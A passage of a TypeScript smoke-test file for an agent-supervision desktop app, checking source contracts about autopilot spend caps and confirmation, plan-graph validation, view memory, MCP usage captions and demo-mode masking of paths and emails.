    && controlViewSrc.includes("return decision === 'approve' ? 'Task marked complete.' : 'Task marked failed. Reopen it when the next pass is ready.';")
    && !/Task marked \$\{decision\.replace/.test(controlViewSrc)
    && controlViewSrc.includes('no base commit recorded')
    && !controlViewSrc.includes('not a git repo'),
    'Control announces a review decision in words that match what control.ts wrote, and a goal with no recorded base commit says so instead of naming a cause the renderer cannot observe');

  // Only provider-reported cost is counted against the cap (autopilotSpend),
  // so "$0.00 reported" beside a $20 ceiling can mean nothing was spent or that
  // nothing was reported — different facts, and the second one is the cap being
  // a weaker promise than it looks. The card says which, in words beside the
  // number, instead of letting the figure imply the stronger claim. The tables
  // are keyed on DocketAutopilot's own union so a fifth spend status is a
  // compile error here rather than a row that is silently missing at runtime.
  check(/const SPEND_MARKS: Record<DocketAutopilot\['spendStatus'\], MarkSpec>/.test(controlViewSrc)
    && /const SPEND_READING: Record<DocketAutopilot\['spendStatus'\], string>/.test(controlViewSrc)
    && controlViewSrc.includes('which is not the same as nothing having been spent')
    && controlViewSrc.includes('{usd(auto.spendUsd)} reported')
    && controlSrc.includes("spendStatus: DocketAutopilot['spendStatus'] = reported === sessions.length"),
    'the autopilot card reports what a provider actually vouched for: reported spend beside the cap, with a mark and a sentence saying how much of the goal that figure covers');

  // control.ts refuses to arm a goal with no cap, and a card that offered the
  // button anyway would meet that refusal as an error after the press. The
  // no-cap branch is ordered ahead of the confirmation branch, so the button is
  // not merely disabled, it is not rendered — and what stands in its place is
  // the field that fixes the missing ceiling, because the create card makes a
  // budget optional and nothing else could set one afterwards.
  const capBranchAt = controlViewSrc.indexOf('cap === null ? <Hint>Autopilot needs a spend cap');
  const armConfirmAt = controlViewSrc.indexOf('confirming ? <ConfirmNote verb="Arm autopilot"');
  check(capBranchAt > 0 && armConfirmAt > capBranchAt
    && controlViewSrc.includes("window.wanigan.control.setBudget(docket.id, Number(budgetDrafts[docket.id] ?? ''))")
    && /\{cap === null \? 'Set cap' : 'Update cap'\}/.test(controlViewSrc)
    && controlSrc.includes('Set a budget on this goal before enabling autopilot.'),
    'a goal with no spend cap cannot arm autopilot from Control — the card renders the cap field in place of the button, matching the precondition control.ts enforces');

  // Arming is the control that lets an agent spend real money with nobody at
  // the keyboard, so it is the one action on this screen behind a T2
  // confirmation — and the sentence is the point of the tier rather than
  // decoration. It names the cap that will stop the run and says outright that
  // tasks dispatch without being asked about again. The visible button opens
  // that prompt and never arms: onArm is reachable only from ConfirmNote's Run.
  check(controlViewSrc.includes('<ConfirmNote verb="Arm autopilot"')
    && /onRun=\{onArm\}/.test(controlViewSrc)
    && !/onClick=\{onArm\}/.test(controlViewSrc)
    && controlViewSrc.includes('onClick={onAsk}')
    && controlViewSrc.includes('the {usd(cap)} cap')
    && controlViewSrc.includes('without asking again')
    && controlViewSrc.includes('spend money with nobody watching'),
    'arming autopilot is confirmed by a prompt that names the spend cap and says tasks dispatch without further approval, and the Arm button opens that prompt rather than arming');

  // control.setAutopilot had every part of its lane built and no way in: the
  // sweep timer, the 'node' queue runner, the budget precondition and the halt
  // that writes its own reason were all reachable only from a flag no renderer
  // surface could set, so no docket was ever autopilot=1 and none of it ever
  // ran. A channel nobody calls looks exactly like a feature nobody uses, which
  // is why this is a source contract rather than a UI test.
  check(/window\.wanigan\.control\.setAutopilot\(docket\.id, \{ enabled: true, providerId, model: model\.trim\(\) \|\| undefined \}\)/.test(controlViewSrc)
    && controlViewSrc.includes('window.wanigan.control.setAutopilot(docket.id, { enabled: false })')
    && controlViewSrc.includes('>Arm autopilot<')
    && controlViewSrc.includes('>Disarm autopilot<')
    && preloadSrc.includes("call<DocketDetail>('control:setAutopilot'")
    && mainSrc.includes("handle('control:setAutopilot'")
    && controlSrc.includes('export function setAutopilot('),
    'Control can arm and disarm goal autopilot, so the sweep, the node queue runner and the halt behind control.setAutopilot have a caller instead of being a finished lane no screen could enter');

  // control.create has accepted a `plan` since buildPlan landed, and no renderer
  // surface ever sent one: every goal in the app got the same four phases, so the
  // node cap, the cycle walk, the terminal-review rule and the claim-overlap check
  // had only ever run against the one graph they pass trivially — a validator with
  // no way in looks exactly like a validator nobody violates. Control now hands the
  // editor's rows to that same call, seeded from DEFAULT_DOCKET_PLAN, so a goal
  // created without opening the editor is the goal Control always created. Source
  // contract because the smoke process has no renderer to press a button in.
  const planEditorSrc = sourceOf('src/renderer/src/components/PlanEditor.tsx');
  const planTypesSrc = sourceOf('src/shared/types.ts');
  check(planEditorSrc.length > 2000
    && controlViewSrc.includes("import PlanEditor, { planProblems, planRowsFromDefault, toPlanNodes } from '../components/PlanEditor';")
    && controlViewSrc.includes('useState<PlanRow[]>(planRowsFromDefault)')
    && controlViewSrc.includes('plan: toPlanNodes(plan)')
    && controlViewSrc.includes('<PlanEditor rows={plan} onChange={setPlan} />')
    && planEditorSrc.includes('return DEFAULT_DOCKET_PLAN.map((node) => ({')
    && preloadSrc.includes('plan?: DocketPlanNode[]')
    && controlSrc.includes('const planned = buildPlan(input.plan?.length ? input.plan : DEFAULT_PLAN);'),
    'Control creates a goal from a task graph the operator can edit and submits its nodes, seeded from the shared default plan, so buildPlan validates something other than the one graph it always passed');

  // The kind picker reads DOCKET_NODE_KINDS. control.ts interpolates that same
  // array into the refusal it writes for a bad kind, so a private list retyped
  // here could offer a word this app would then reject in its own dialect — and
  // the day a fifth kind is added, the picker would be the surface that silently
  // did not learn about it.
  check(planEditorSrc.includes("import type { DocketNodeKind, DocketPlanNode } from '@shared/types';")
    && /DOCKET_NODE_KINDS\.map\(\(kind\) => <option key=\{kind\} value=\{kind\}>\{kind\}<\/option>\)/.test(planEditorSrc)
    && !/\[\s*'plan',\s*'implement'/.test(planEditorSrc)
    && planTypesSrc.includes("export const DOCKET_NODE_KINDS: readonly DocketNodeKind[] = ['plan', 'implement', 'verify', 'review'];")
    && /use one of: \$\{NODE_KINDS\.join\(', '\)\}/.test(controlSrc),
    'the plan editor offers exactly the four task kinds shared/types declares and main names in its own refusal, rather than a private list beside them that can drift');

  // A cycle needs a forward edge, so the editor does not render the control that
  // would draw one: a task's prerequisite chips are built from rows.slice(0, index)
  // and the first task is told in words that it has nothing above it. Reordering is
  // where a naive editor invents the cycle it spent the rest of its code
  // preventing, so a swap is applied to a rebuilt graph and refused unless every
  // edge still points backwards — refused rather than silently repaired, because
  // dropping the edge would change the graph the operator drew without saying so.
  // control.ts's walk still runs; it is the one that has to survive a hand-written
  // plan. Source contract because the smoke process has no renderer to drag a row in.
  check(/rows\.slice\(0, index\)\.map\(\(earlier, dep\) => \{/.test(planEditorSrc)
    && planEditorSrc.includes('The first task has nothing above it to wait on')
    && planEditorSrc.includes('export function reordered(rows: PlanRow[], from: number, to: number): PlanRow[] | null {')
    && planEditorSrc.includes('const backwards = next.every((row, index) => row.dependsOn.every((dep) => dep < index));')
    && planEditorSrc.includes('return backwards ? next : null;')
    && planEditorSrc.includes('disabled={up === null}')
    && planEditorSrc.includes('disabled={down === null}')
    && controlSrc.includes('This task graph has a cycle'),
    'a dependency drawn in the plan editor can only point at a row above it, and a reorder that would turn an existing edge forward is refused, so the cycle control.ts rejects cannot be drawn in the first place');

  // The rules the editor cannot make structurally impossible are stated inline,
  // in main's own sentences, before the button — and Create is gated on the same
  // exported list the editor renders, so it is never disabled for a reason nobody
  // can see. A validator that only speaks after the press is the rule stated twice
  // and heard once, with the goal already discarded by the time it is read.
  check(controlViewSrc.includes('const planFaults = useMemo(() => planProblems(plan), [plan]);')
    && controlViewSrc.includes('disabled={busy !== null || missing.length > 0 || planFaults.length > 0}')
    && controlViewSrc.includes("aria-describedby={missing.length > 0 || planFaults.length > 0 ? 'control-create-blocked' : undefined}")
    && planEditorSrc.includes('export function planProblems(rows: PlanRow[]): PlanProblem[] {')
    && planEditorSrc.includes('A goal needs one review task; the human decision is its final gate.')
    && controlSrc.includes('A goal needs one review task; the human decision is its final gate.')
    && planEditorSrc.includes('would be accepted without anyone reviewing it.')
    && controlSrc.includes('would be accepted without anyone reviewing it.')
    && planEditorSrc.includes('Order them with a dependency, or narrow one of the paths.')
    && controlSrc.includes('Order them with a dependency, or narrow one of the paths.')
    && controlCssSrc.includes('.control-plan-problem {'),
    'every graph control.ts would refuse is named beside the offending task before Create is pressed, in the same words main would have thrown, and the button is gated on that same list');

  // Fleet is the view most likely to be left behind, because its cards exist to
  // be clicked into and every click unmounts it. Sort, status filter and scroll
  // offset were component state, so narrowing to "Asking", opening the one agent
  // that is blocked and coming back showed every session sorted by attention
  // again with the grid at the top. Nothing said so, which reads as the fleet
  // having changed while the operator was away. Source contract because the
  // smoke process has no renderer to swap tabs in. `fleetViewSrc` is already
  // read above for the "Asking permission" tile.
  check(fleetViewSrc.includes("useViewMemory<SortKey>('sort', 'attention')")
    && fleetViewSrc.includes("useViewMemory<AttentionKind | 'all'>('only', 'all')")
    && fleetViewSrc.includes("useRememberedScrollRef('pane')")
    && /import \{ useRememberedScrollRef, useViewMemory \} from '\.\.\/components\/viewMemory';/.test(fleetViewSrc)
    && !/const \[sort, setSort\] = useState/.test(fleetViewSrc)
    && !/const \[only, setOnly\] = useState/.test(fleetViewSrc)
    // The offset is remembered on the element that owns one. .fleet-grid is a
    // CSS grid with no overflow, so a scroll ref there would attach a listener
    // that never fires and restore nothing while looking implemented.
    && fleetViewSrc.includes('<div className="pane" ref={paneRef}>'),
    'Fleet remembers its sort, its status filter and how far down the grid the operator had scrolled, so opening a blocked agent and coming back does not silently re-sort the fleet and scroll it to the top');

  // Learning unmounts on every tab swap like every other view, so an operator
  // reading the Inbox came back to Overview, at the top, with no notice that
  // anything had moved. The tab is view memory now. The experiments guard had
  // to learn to wait with it: on mount `experiments` is still the initial empty
  // array, and firing on that would bounce a returning reader off a remembered
  // 'experiments' tab every time, before a read had counted anything. Source
  // contract because the smoke process has no renderer to swap tabs in.
  check(learningSrc.includes("useViewMemory<LearningTab>('tab', 'overview')")
    && /import \{ useRememberedScrollRef, useViewMemory \} from '\.\.\/components\/viewMemory';/.test(learningSrc)
    && !/const \[tab, setTab\] = useState/.test(learningSrc)
    && learningSrc.includes("if (read.observed && tab === 'experiments' && experiments.length === 0) setTab('overview')")
    && learningSrc.includes("const tabs = experiments.length > 0 || tab === 'experiments' ? [...TABS, EXPERIMENTS_TAB] : TABS;"),
    'Learning reopens on the tab the operator was reading instead of snapping back to Overview, and the experiments guard only hands them back once a read has actually observed that there are no experiments');

  // One `.learning-scroll` element is filled by five panels in turn, so a single
  // remembered offset would restore the Inbox's position onto Knowledge — a
  // different document of a different length — and drop the reader somewhere
  // they had never been. The key carries the open tab.
  check(learningSrc.includes('const panelRef = useRememberedScrollRef(`panel:${tab}`);')
    && /<div className="learning-scroll" ref=\{panelRef\}/.test(learningSrc),
    "the Learning panel remembers one scroll offset per tab, keyed 'panel:<tab>' and attached to the single scroller, so returning to Knowledge cannot land the reader at the offset they left the Inbox at");

  // Settings used to split a single tab across multiple `tabpanel` nodes, and
  // switching categories unmounted whatever form was in the other one. This is
  // a source contract because the Electron smoke process has no renderer: it
  // protects the operator surfaces and the semantics that preserve an unsaved
  // provider key, queue limit, phone configuration, or MCP draft mid-edit.
  const settingsSurfaces = [
    'Claude Platform API key', 'GLM Coding Plan', 'DeepSeek', 'Installed agent runtimes',
    'Projects', 'Worktrees', 'Trust and the policy ledger', 'Spending', 'Dispatcher',
    'Phone monitor', 'MCP servers', 'Observation', 'What leaves this machine', 'Storage',
    'Appearance', 'Motion', 'Demo mode', 'Backup & restore',
  ];
  // 'backup' joined these when backup/restore shipped: before it, the SQLite
  // database CLAUDE.md calls the source of truth for all evidence and knowledge
  // had no export, no backup and no restore anywhere in the app.
  const settingsPanels = ['agents', 'projects', 'automation', 'connections', 'privacy', 'backup', 'app'];
  check(settingsSurfaces.every((surface) => settingsSrc.includes(surface))
    && settingsPanels.every((panel) => settingsSrc.includes(`settingsTabInfo('${panel}')`))
    && (settingsSrc.match(/<SettingsTabPanel\b/g) ?? []).length === settingsPanels.length
    && settingsSrc.includes('role="tablist"') && settingsSrc.includes('role="tabpanel"')
    && settingsSrc.includes('aria-controls={`settings-${tab.id}`}')
    && settingsSrc.includes('aria-labelledby={`settings-tab-${tab.id}`}')
    && settingsSrc.includes('hidden={!active}') && settingsSrc.includes('moveSettingsTab')
    // The rule moved with the sheet: Settings' stylesheet used to be a template
    // string inside the view, and is styles/settings.css now.
    && sourceOf('src/renderer/src/styles/settings.css').includes('.set.pane { width: 100%; max-width: none;')
    && settingsSrc.includes("import '../styles/settings.css'")
    && !settingsSrc.includes('<style>')
    && !settingsSrc.includes('<div className="pane set" style={{ maxWidth'),
  'Settings keeps every operator surface in seven labelled persistent full-width tab panels, with keyboard navigation and no draft-destroying unmount');

  // The paragraph under those rows is the answer to 'what does walking away
  // cost', and it is only honest if it names both halves. Each clause was
  // written against the code that decides it: queue.recoverExpiredLeases
  // requeues a row that had not started, tickSchedules catches a schedule up
  // once rather than once per missed interval, headless.sweepInterruptedRows
  // errors a mid-run repository instead of re-spawning an unwatched agent, and
  // CLAUDE.md's rule that a live PTY cannot survive a quit covers the last.
  // The headless half is pinned against that module's own message, so a
  // paragraph that keeps only the reassuring clauses — or a sweep that quietly
  // starts resuming runs — fails here rather than on someone's lock screen.
  check(settingsSrc.includes('<strong>What a restart would cost.</strong>')
    && settingsSrc.includes('A queued job that never started is still queued')
    && settingsSrc.includes('A schedule keeps its next fire and catches up')
    && settingsSrc.includes('repository that was mid-run is not resumed')
    && settingsSrc.includes('An interactive session is a live terminal process')
    && sourceOf('src/main/headless.ts').includes('Nothing was resumed — start the fan-out again for this repository.'),
    "the 'Before you leave' restart paragraph names both what survives a restart (a queued job, a schedule's next fire) and what does not (a headless repository that was mid-run, an interactive session), and its headless claim still matches the sweep that errors those rows");

  // 'Before you leave' answers whether the lid can close, so a row that could
  // not be read must never render as a pass. Three things hold that up, and a
  // renderer-free smoke process can only pin them as a source contract.
  //
  // The sleep bridge lands in a different phase, so this view reads it through
  // an optional cast and then narrows it field by field: without the typeof
  // guard an absent `onBattery` coerces to false and the panel prints 'plugged
  // in' about a laptop running on its battery, which is the one wrong answer
  // this block exists to prevent. 'reading' and 'unreadable' carry marks of
  // their own rather than rendering as a blank a reader completes as a pass.
  // And the transport row draws TRANSPORT_MARK rather than naming a sixth
  // state for a fact the transport panel above already has five words for.
  check(settingsSrc.includes('<Section title="Before you leave"')
    && settingsSrc.includes("if (typeof d.onBattery !== 'boolean' || typeof d.held !== 'boolean') return null;")
    && !/onBattery\s*(\?\?|\|\|)/.test(settingsSrc)
    && settingsSrc.includes("const STILL_READING: MarkSpec = { glyph: '·', word: 'reading'")
    && settingsSrc.includes("const UNREADABLE: MarkSpec = { glyph: '?', word: 'unreadable'")
    && settingsSrc.includes('return { what, mark: TRANSPORT_MARK[state], say };')
    && settingsSrc.includes("word: 'on battery'") && settingsSrc.includes("word: 'plugged in'")
    && settingsSrc.includes("word: 'held awake'") && settingsSrc.includes("word: 'not held'")
    && settingsSrc.includes("word: 'listening'") && settingsSrc.includes("word: 'not listening'")
    && settingsSrc.includes('const checks = [powerCheck(), sleepCheck(), transportCheck(), reachCheck()];'),
    "the 'Before you leave' check renders four rows from observed readings — the sleep bridge narrowed field by field so an absent value cannot read as 'plugged in', a mark of its own for reading and for unreadable, and the transport row reusing the five states the transport panel already defined");

  // Settings was the last view wearing a private page head: an accent kicker
  // reading 'Wanigan control center' over an h1 that spelled its own font size,
  // in a two-column grid still reserving most of a third of the header band for
  // an aside deleted a phase earlier. It is the shared PageHead now, compact, so
  // the title steps down through .pane-head.compact rather than a per-view size.
  // No eyebrow: bits.tsx records that the eyebrow is the view's section noun or
  // nothing, never an app-name slogan, and 'Settings' over 'Settings' is an echo.
  // Pinned in both files, because a rule that outlives its markup is the thing
  // that grows the markup back.
  const settingsSheet = sourceOf('src/renderer/src/styles/settings.css');
  check(settingsSrc.includes('<PageHead compact title="Settings"')
    && !settingsSrc.includes('set-hero') && !settingsSrc.includes('set-kicker')
    && !settingsSheet.includes('.set-hero') && !settingsSheet.includes('.set-save-guide')
    // The per-panel kicker is a section label, not the page eyebrow, and stays.
    && settingsSrc.includes('set-panel-kicker') && settingsSheet.includes('.set-panel-kicker'),
  'Settings heads with the shared compact PageHead and no eyebrow, and neither the view nor its sheet keeps the old hero');

  // Settings' Dispatcher shipped a "slots" row for the 'node' lane — Goal
  // autopilot — while nothing in the renderer could arm it. control.setAutopilot
  // is registered in main and bound in preload, but no view calls it, so no
  // docket is ever autopilot=1, the sweep never writes a node queue row, and
  // that meter could only ever read "none running". A concurrency limit for a
  // lane with no launcher configures a feature the operator cannot switch on.
  //
  // Written as a biconditional rather than a flat "the row is gone" so it stays
  // true in both directions: the phase that gives Control a way to arm autopilot
  // has to bring the row back in the same change, and a row cannot reappear
  // ahead of its launcher. The explanatory comment lives inside KIND_COPY and
  // names the lane, so this matches the field syntax rather than the label text.
  const slotRows = /const KIND_COPY[\s\S]*?\n\];/.exec(settingsSrc)?.[0] ?? '';
  const rendererFiles = filesUnder(path.join(appRoot(), 'src/renderer/src')).filter((f) => /\.tsx?$/.test(f));
  const canArmAutopilot = rendererFiles.some((f) => /\.setAutopilot\s*\(/.test(fs.readFileSync(f, 'utf8')));
  check(slotRows.length > 200 && rendererFiles.length > 10
    && ["'session'", "'headless'", "'batch'", "'scout'"].every((id) => slotRows.includes(`id: ${id}`))
    && /id:\s*'node'/.test(slotRows) === canArmAutopilot
    && settingsSrc.includes('const dirty = KIND_COPY.some(({ id }) => d[id] !== loaded[id])'),
  'the Dispatcher offers a slot limit for the autopilot lane only if some renderer surface can actually arm it',
  `renderer files ${rendererFiles.length}, canArm ${canArmAutopilot}, row ${/id:\s*'node'/.test(slotRows)}`);

  // The first caller of mcp:status. The handler and the preload binding existed
  // for a release with nothing on the other end, which is the shape that lets a
  // channel rot unnoticed; this asserts the whole path, plus the caption that
  // stops the two columns reading as a health check, plus the removal of the
  // three false present-tense clauses the old comment made about a table, and
  // two writers, that no longer exist.
  check(/handle\(\s*'mcp:status'/.test(mainSrc)
    && /status:\s*\(\)\s*=>\s*call/.test(preloadSrc)
    && settingsSrc.includes('window.wanigan.mcp.status()')
    && settingsSrc.includes('Calls on record') && settingsSrc.includes('Last call')
    && settingsSrc.includes('a floor and not a total')
    && settingsSrc.includes('Zero means no call is on record — never that the server does not')
    && !settingsSrc.includes('noteConnection') && !settingsSrc.includes('noteToolCall')
    && !settingsSrc.includes('nothing in the app has ever written that table')
    && !settingsSrc.includes('The table and its writers are left alone'),
    'the MCP panel reads use from the hook-bus record through mcp:status, captions it as a floor rather than a health check, and no longer claims in a comment that a deleted table is merely unwritten',
    `caller ${settingsSrc.includes('window.wanigan.mcp.status()')}, caption ${settingsSrc.includes('a floor and not a total')}`);

  // Three load states, three renderings, and a number in exactly one of them.
  // An empty count before the first read has returned, or a zero substituted for
  // a read that failed, is the bug the deleted mcp_status columns shipped for the
  // life of an install; this fails if either comes back.
  const mcpUseCells = settingsSrc.slice(settingsSrc.indexOf('<th className="r">Calls on record</th>'),
                                        settingsSrc.indexOf('a floor and not a total'));
  check(mcpUseCells.length > 400
    && mcpUseCells.includes('use.v.s === \'loading\' ? <span className="faint">reading…</span>')
    && mcpUseCells.includes('use.v.s === \'err\' ? <span className="faint">unreadable</span>')
    && mcpUseCells.includes("'no call on record'")
    // The error branch may not reach for a number on any of its lines.
    && !/'err'[^\n]*num\(/.test(mcpUseCells),
    'a use read that has not returned and a use read that failed each say so in their own words, and neither is allowed to print a call count — only a read that came back does that',
    `cells ${mcpUseCells.length}`);

  // Independent loads, not one folded read. Folding use into the server list
  // would mean a failed status read blanks the configured servers, and would
  // collapse "could not read" and "nothing was called" into one empty cell.
  // The list read is mcp:review rather than mcp:servers because McpServerConfig
  // carries no trust field, so a page reading it cannot tell a server being
  // handed to sessions from one switched on and withheld from every one.
  // A row that is switched on but never approved is the case the standing note
  // describes. Without this branch the only click available on it is a plain
  // switch-off, and the sentence offering to read and approve its command names
  // an act the page does not perform.
  check(settingsSrc.includes("if (!on && s.enabled && s.transport === 'stdio' && s.trust === 'needs-trust')")
    && settingsSrc.includes('onDisable={() => void toggleServer(s, false)}'),
    'a row that is switched on and withheld opens its command for reading rather than only switching off, and the reading panel offers the switch-off it intercepted');

  check(settingsSrc.includes('const servers = useLoad(() => window.wanigan.mcp.review(), [tick]);')
    && settingsSrc.includes('const use = useLoad(() => window.wanigan.mcp.status(), [tick]);')
    && settingsSrc.includes('const useOf = (id: string) => (use.v.s === \'ok\' ? use.v.d.find((u) => u.id === id) ?? null : null);'),
    'the MCP server list and the MCP call record are two independent reads, so a failed use read cannot blank the servers and cannot be mistaken for a server that was never called',
    String(settingsSrc.includes('const use = useLoad(() => window.wanigan.mcp.status(), [tick]);')));

  // The caption explains a zero and the warn Note explains two blank columns.
  // Both used to render as siblings of the Frame, so they also printed over the
  // "no servers configured" empty state and over the server-list error panel —
  // explaining a zero nobody had been shown, and telling a reader the server
  // list was unaffected in the one state where that read had failed too.
  check(settingsSrc.includes("const useColumnsShown = servers.v.s === 'ok' && servers.v.d.length > 0;")
    && settingsSrc.includes("{useColumnsShown && use.v.s === 'err' && (")
    && settingsSrc.includes('{useColumnsShown && (\n        <p className="set-caption">')
    && !settingsSrc.includes('itself comes from a separate read and is unaffected'),
    'the MCP use caption and the failed-read note render only when the columns they explain are on screen, so neither explains a zero nobody was shown nor reports on a read it did not inspect',
    String(settingsSrc.includes("const useColumnsShown = servers.v.s === 'ok' && servers.v.d.length > 0;")));

  // NEGATIVE, and the one that catches this work being reverted or dropped
  // wholesale. Do NOT write this as
  // !/colSpan=\{5\}/.test(settingsSrc.slice(settingsSrc.indexOf('function Mcp(')))
  // — two unrelated colSpan={5} cells live far after function Mcp( ends, so that
  // form is false today and would fail whether or not this change landed. Scope
  // it to the Mcp function body.
  const mcpFn = settingsSrc.slice(settingsSrc.indexOf('function Mcp({ projects, prefs, pending, setFlag }'),
                                  settingsSrc.indexOf('function Worktrees()'));
  check(mcpFn.length > 2000
    && (mcpFn.match(/colSpan=\{7\}/g) ?? []).length === 2
    && !mcpFn.includes('colSpan={5}')
    && (mcpFn.match(/<th\b/g) ?? []).length === 7,
    'the MCP table has seven header cells and both of the rows that span it were widened to seven with them, so the remove confirmation and the enable review still run the full width of the table',
    `th ${(mcpFn.match(/<th\b/g) ?? []).length}, colSpan7 ${(mcpFn.match(/colSpan=\{7\}/g) ?? []).length}`);

  // The Dispatcher row that caps a lane names the surface that arms it.
  check(settingsSrc.includes('armed per goal in Control')
    && !settingsSrc.includes('Tasks a goal dispatches on its own, unattended.'),
    'the Dispatcher row that limits goal autopilot names the surface that switches it on, instead of describing a lane with no stated way in',
    String(settingsSrc.includes('armed per goal in Control')));

  // NEGATIVE. .set-jump is only ever worn as `className="link set-jump"`, and
  // .link (index.css) already supplies the accent and the underline at the same
  // specificity and the same values. Restating them there is a private duplicate
  // of a base class, which is the shape that has bitten this repo three times.
  const setJumpRule = /\.set-jump \{[^}]*\}/.exec(settingsSheet)?.[0] ?? '';
  check(setJumpRule.length > 20
    && !setJumpRule.includes('color:') && !setJumpRule.includes('text-decoration:')
    && setJumpRule.includes('padding: 0')
    && settingsSrc.includes('className="link set-jump"'),
    'the settings jump link takes its colour and underline from .link rather than restating them at equal specificity, and keeps only the button reset .link does not provide',
    setJumpRule);

  const kindDecl = /type Kind = ([^;]+);/.exec(schedulesSrc)?.[1] ?? '';
  check(kindDecl.includes("'batch'") && !kindDecl.includes("'session'"),
    "the Schedules form offers headless and batch and no longer offers 'session'", kindDecl.trim());

  // The four buttons in a schedule's action row are one control size. Pause and
  // History used to spell .btn-sm's padding and font-size inline while dropping
  // its min-height, so they stood at .btn's 32px beside Edit and Delete at 26px:
  // the inline copy reproduced the two declarations you can see and lost the one
  // that mattered. Naming the size class is what keeps the row level, and this
  // asserts the whole row rather than the two buttons that were wrong, because
  // the next hand-rolled height would arrive on a different button.
  const scOpen = schedulesSrc.indexOf('<div className="sc-actions">');
  const scActions = schedulesSrc.slice(scOpen, schedulesSrc.indexOf('</div>', scOpen));
  const scButtons = scActions.match(/className="btn[^"]*"/g) ?? [];
  check(scOpen > 0 && scActions.length > 100 && scButtons.length === 4
    && scButtons.every((c) => c.includes('btn-sm'))
    && !scActions.includes('style={{')
    // A coarse pointer still gets a 44px target: that rule's selector is two
    // classes deep, so it outranks .btn-sm and the shrink is desktop-only.
    && /\.sc-actions \.btn[^{}]*\{[^}]*min-height:\s*44px/.test(compactCssSrc),
    'every button in a schedule action row takes its height from .btn-sm rather than an inline copy of part of it, and a coarse pointer still gets a 44px target',
    scButtons.join(' | '));

  /* -- demo mode: partial masking is the failure ---------------------- */
  say('-- demo mode');
  const wasOn = demo.demoOn();
  demo.setDemo(true);

  const home = os.homedir();
  const user = home.split('/').filter(Boolean).pop() ?? 'user';
  const sample = {
    name: 'wanigan',
    path: home + '/Projects/drupal/wanigan',
    nested: [{ msg: `failed to read ${home}/Projects/drupal/wanigan/src/main/git.ts` }],
    email: 'alex@example.com',
  };
  const masked = demo.maskOut(sample) as typeof sample;

  check(!JSON.stringify(masked).includes(home), 'the home directory is gone from a masked response');
  check(!JSON.stringify(masked).includes('@gmail.com'), 'a real email address is gone');
  check(masked.nested[0].msg.includes('/Users/demo'), 'masking reaches nested values, not just top-level fields',
    masked.nested[0].msg);
  // The round trip is what keeps the app working while a demo is running.
  const back = demo.unmaskIn(masked) as typeof sample;
  check(back.path === sample.path, 'a masked path unmasks back to the real one', back.path);

  demo.setDemo(false);
  const passthrough = demo.maskOut(sample) as typeof sample;
  check(passthrough.path === sample.path, 'nothing is masked when demo mode is off');
  check(demo.maskOut('/plain/string') === '/plain/string', 'strings pass through untouched when off');
  demo.setDemo(wasOn);

  /* -- the blur is a stored preference, not a browser flag ------------ */
  const wasBlurred = demo.demoBlur();
  demo.setDemoBlur(true);
  check(demo.demoBlur() === true && demo.demoState().blurTerminals === true,
    'blurring terminals is remembered in the settings table and handed back beside the switch in one demo:state answer, so the reload demo:set performs can restore both instead of coming back with masked names over an unblurred terminal',
    JSON.stringify({ blur: demo.demoBlur(), state: demo.demoState().blurTerminals }));

  let refusedBlur = '';
  try { demo.setDemoBlur('yes' as unknown as boolean); }
  catch (e) { refusedBlur = e instanceof Error ? e.message : String(e); }
  check(refusedBlur === 'Blur terminals is either on or off.' && demo.demoBlur() === true,
    'a non-boolean arriving from the renderer is refused by name and leaves the stored preference exactly where it was, because a value that is neither on nor off would read back as off on precisely the launch someone was about to share their screen',
    `${refusedBlur} · still ${demo.demoBlur()}`);

  demo.setDemoBlur(false);
  check(demo.demoState().blurTerminals === false && demo.demoState().on === demo.demoOn(),
    'turning the blur off leaves demo mode itself alone: both halves of demo:state come from the same settings table but remain two separate answers, so the preference survives demo mode being switched off and on again',
    JSON.stringify(demo.demoState()));
  demo.setDemoBlur(wasBlurred);

  check(appSrc.includes("toggleAttribute('data-demo-blur'")
    && appSrc.includes('blur(true);')
    && appSrc.includes('blur(s.on && s.blurTerminals)'),
    'the always-mounted shell re-applies the terminal blur from the stored answer and starts blurred before that answer arrives, so the window between mount and the first demo:state reply cannot be the one where a shared screen shows raw agent output',
    String(appSrc.includes('blur(true);')));

  check(appSrc.includes("localStorage.removeItem('wanigan.demo.blurTerminal')")
    && !settingsSrc.includes("localStorage.getItem('wanigan.demo.blurTerminal')")
    && !settingsSrc.includes("localStorage.setItem('wanigan.demo.blurTerminal'"),
    'the legacy browser flag is carried over once by App and read nowhere else, so an operator who had already ticked Blur terminals keeps it while Settings can no longer write a second copy of a preference the settings table now owns',
    String(settingsSrc.includes('wanigan.demo.blurTerminal')));

  check(!settingsSrc.includes('const [blur, setBlur] = useState')
    && settingsSrc.includes('checked={state.blurTerminals}')
    && settingsSrc.includes('window.wanigan.demo.setBlur(next)'),
    'the demo panel holds no second copy of the blur: the checkbox is drawn from the state the main process returned and a failed write leaves it where it was rather than showing a preference that was never stored',
    String(settingsSrc.includes('const [blur, setBlur] = useState')));

  check(settingsSrc.includes('useState<DemoState | null>(null)')
    && settingsSrc.includes('if (!state) return;')
    && !settingsSrc.includes('{ on: false, blurTerminals: false, map: [] }'),
    'the demo panel holds no answer until demo:state replies and writes the global data-demo-blur attribute only from an answer, so opening Settings can no longer clear the blur the always-mounted shell applied by turning a seeded {on:false, blurTerminals:false} into a claim about the stored preference',
    String(settingsSrc.includes('useState<DemoState | null>(null)')));

  check(!settingsSrc.includes('demo.state().then(setState).catch(() => {})')
    && settingsSrc.includes('setReadErr(msg(e))')
    && settingsSrc.includes('<PanelError what="whether demo mode is on"'),
    'a rejected demo:state read is named on the panel with a Try again button instead of being swallowed by an empty catch, because the swallowed rejection used to leave terminals unblurred for the rest of the session while main-process masking kept inventing project names over them',
    String(settingsSrc.includes('setReadErr(msg(e))')));

  check(!settingsSrc.includes('Every tool call an agent made was allowed or asked')
    && settingsSrc.includes("const counts = summary.v.s === 'ok' ? summary.v.d : null;"),
    'the denied-only empty state no longer certifies every tool call an agent made from a query that returned no rows: it reads the whole-ledger summary, which policy.ledgerSummary counts unbounded by the row limit, and falls back to "Nothing recorded yet" when that summary counts nothing at all',
    String(settingsSrc.includes('Every tool call an agent made was allowed or asked')));

  check(!settingsSrc.includes('The pack itself is unchanged')
    && settingsSrc.includes('adapter trust revoked, and the pack is disabled for new launches'),
    'the revoke-adapter toast reports the enabled:false that revokeAdapterTrust writes beside the trust it clears, so the operator is not told the pack is unchanged by the one action that just disabled it',
    String(settingsSrc.includes('The pack itself is unchanged')));

  check(!settingsSrc.includes('Claude, Codex and GLM')
    && settingsSrc.includes('— not even the built-in'),
